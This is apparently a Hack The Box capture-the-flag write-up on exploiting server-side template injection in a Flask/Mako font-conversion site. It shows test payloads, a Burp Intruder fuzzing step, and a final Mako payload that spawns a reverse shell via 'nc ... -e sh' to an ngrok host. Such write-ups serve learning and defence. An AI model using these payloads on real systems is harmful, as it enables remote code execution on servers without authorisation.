The website is requesting user input and it transforms it into other fonts.

![image](https://user-images.githubusercontent.com/80063008/198247905-9ff0ebaa-35b4-4ef8-b7a1-92395c9480ff.png)

According to the source code it is using Flask Mako templating.

![image](https://user-images.githubusercontent.com/80063008/198247967-4c8a36de-01d3-4bd7-a54f-6fe8a1043c1a.png)

We can try a quick SSTI payload and can see that indeed it is vulnerable to this type of attacks.

```${6*6}```

![image](https://user-images.githubusercontent.com/80063008/198248049-de6ab918-456f-42b1-84a1-2877535ecebe.png)

However, when trying the Mako SSTi payload suggested on Hacktricks, the website crashes.

```<# import os x=os.popen('id').read()> ${x}```

![image](https://user-images.githubusercontent.com/80063008/198248164-21d96217-5d0a-4028-8d9e-09fa34c6a8e9.png)

After a bit more research, we find other potential payloads on PayloadAllTheThings.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#direct-access-to-os-from-templatenamespace

The first couple didn't work for me so what I did is I copied the entire list, sent the request to BurpSuite Intruder on the local docker with the list of payloads and looked at the error log. 

![image](https://user-images.githubusercontent.com/80063008/198249414-f57a1312-d1b7-457d-baeb-96ef938e8a15.png)

I noticed we had command execution on the server side with the payload below so I got a reverse shell.

```${self.template.module.runtime.util.os.system("nc 0.tcp.ngrok.io 19024 -e sh")}```

![image](https://user-images.githubusercontent.com/80063008/198248211-dcb80109-c09e-42ae-a9b6-3744fc195895.png)

HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
